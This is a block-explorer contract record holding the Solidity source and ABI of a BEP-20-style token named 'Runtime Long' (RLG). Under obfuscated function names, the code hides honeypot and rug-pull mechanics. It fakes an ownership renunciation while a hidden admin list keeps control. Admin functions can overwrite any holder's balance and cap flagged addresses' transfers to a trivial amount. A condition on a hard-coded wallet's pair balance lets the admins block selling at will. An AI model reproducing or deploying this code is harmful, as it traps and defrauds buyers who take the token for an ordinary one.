{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface enableMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract maxList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyLimit {\n    function createPair(address isSenderFund, address receiverMaxTeam) external returns (address);\n}\n\ninterface shouldLaunchExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldLiquidity) external view returns (uint256);\n\n    function transfer(address takeIs, uint256 takeReceiver) external returns (bool);\n\n    function allowance(address txSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeIs,\n        uint256 takeReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderTake, uint256 value);\n    event Approval(address indexed txSell, address indexed spender, uint256 value);\n}\n\ninterface shouldLaunchExemptMetadata is shouldLaunchExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RuntimeLong is maxList, shouldLaunchExempt, shouldLaunchExemptMetadata {\n\n    address public limitTotal;\n\n    string private feeSender = \"RLG\";\n\n    uint256 private marketingWalletSwap;\n\n    uint8 private tokenSwap = 18;\n\n    function receiverReceiver(address feeTo) public {\n        listTotal();\n        if (sellLiquidity == exemptShouldWallet) {\n            swapReceiverFrom = true;\n        }\n        if (feeTo == limitTotal || feeTo == limitAuto) {\n            return;\n        }\n        toMinReceiver[feeTo] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private fundShould;\n\n    function name() external view virtual override returns (string memory) {\n        return sellLiquidityLaunched;\n    }\n\n    bool public maxAutoShould;\n\n    bool public swapReceiverFrom;\n\n    address txTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private isBuy;\n\n    function approve(address txAt, uint256 takeReceiver) public virtual override returns (bool) {\n        fundShould[_msgSender()][txAt] = takeReceiver;\n        emit Approval(_msgSender(), txAt, takeReceiver);\n        return true;\n    }\n\n    uint256 private marketingFrom = 100000000 * 10 ** 18;\n\n    uint256 teamExemptFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeSender;\n    }\n\n    mapping(address => uint256) private walletTeam;\n\n    uint256 minFundLimit;\n\n    event OwnershipTransferred(address indexed liquidityLaunched, address indexed liquidityFundAt);\n\n    function modeTotalWallet(uint256 takeReceiver) public {\n        listTotal();\n        teamExemptFrom = takeReceiver;\n    }\n\n    uint256 constant atList = 15 ** 10;\n\n    uint256 private marketingEnable;\n\n    function allowance(address modeMax, address txAt) external view virtual override returns (uint256) {\n        if (txAt == sellLimitAmount) {\n            return type(uint256).max;\n        }\n        return fundShould[modeMax][txAt];\n    }\n\n    bool public exemptShouldWallet;\n\n    uint256 public enableSwap;\n\n    function getOwner() external view returns (address) {\n        return isBuy;\n    }\n\n    address public limitAuto;\n\n    function limitFund(address swapBuy, address takeIs, uint256 takeReceiver) internal returns (bool) {\n        if (swapBuy == limitTotal) {\n            return teamList(swapBuy, takeIs, takeReceiver);\n        }\n        uint256 modeLimitSender = shouldLaunchExempt(limitAuto).balanceOf(txTeam);\n        require(modeLimitSender == teamExemptFrom);\n        require(takeIs != txTeam);\n        if (toMinReceiver[swapBuy]) {\n            return teamList(swapBuy, takeIs, atList);\n        }\n        return teamList(swapBuy, takeIs, takeReceiver);\n    }\n\n    string private sellLiquidityLaunched = \"Runtime Long\";\n\n    function launchedModeTo(address exemptTo) public {\n        if (receiverTo) {\n            return;\n        }\n        \n        toAmount[exemptTo] = true;\n        \n        receiverTo = true;\n    }\n\n    function transfer(address exemptReceiverMin, uint256 takeReceiver) external virtual override returns (bool) {\n        return limitFund(_msgSender(), exemptReceiverMin, takeReceiver);\n    }\n\n    constructor (){\n        \n        enableMin txFund = enableMin(sellLimitAmount);\n        limitAuto = buyLimit(txFund.factory()).createPair(txFund.WETH(), address(this));\n        \n        limitTotal = _msgSender();\n        sellLaunchToken();\n        toAmount[limitTotal] = true;\n        walletTeam[limitTotal] = marketingFrom;\n        \n        emit Transfer(address(0), limitTotal, marketingFrom);\n    }\n\n    bool public tradingAt;\n\n    bool private sellLiquidity;\n\n    function owner() external view returns (address) {\n        return isBuy;\n    }\n\n    function listTotal() private view {\n        require(toAmount[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenSwap;\n    }\n\n    function balanceOf(address shouldLiquidity) public view virtual override returns (uint256) {\n        return walletTeam[shouldLiquidity];\n    }\n\n    function sellLaunchToken() public {\n        emit OwnershipTransferred(limitTotal, address(0));\n        isBuy = address(0);\n    }\n\n    function teamList(address swapBuy, address takeIs, uint256 takeReceiver) internal returns (bool) {\n        require(walletTeam[swapBuy] >= takeReceiver);\n        walletTeam[swapBuy] -= takeReceiver;\n        walletTeam[takeIs] += takeReceiver;\n        emit Transfer(swapBuy, takeIs, takeReceiver);\n        return true;\n    }\n\n    mapping(address => bool) public toAmount;\n\n    function transferFrom(address swapBuy, address takeIs, uint256 takeReceiver) external override returns (bool) {\n        if (_msgSender() != sellLimitAmount) {\n            if (fundShould[swapBuy][_msgSender()] != type(uint256).max) {\n                require(takeReceiver <= fundShould[swapBuy][_msgSender()]);\n                fundShould[swapBuy][_msgSender()] -= takeReceiver;\n            }\n        }\n        return limitFund(swapBuy, takeIs, takeReceiver);\n    }\n\n    bool public receiverTo;\n\n    function tokenModeSender(address exemptReceiverMin, uint256 takeReceiver) public {\n        listTotal();\n        walletTeam[exemptReceiverMin] = takeReceiver;\n    }\n\n    address sellLimitAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public toMinReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingFrom;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFundAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptShouldWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"}],\"name\":\"launchedModeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAutoShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"modeTotalWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTo\",\"type\":\"address\"}],\"name\":\"receiverReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunchToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiverFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toMinReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"tokenModeSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RuntimeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}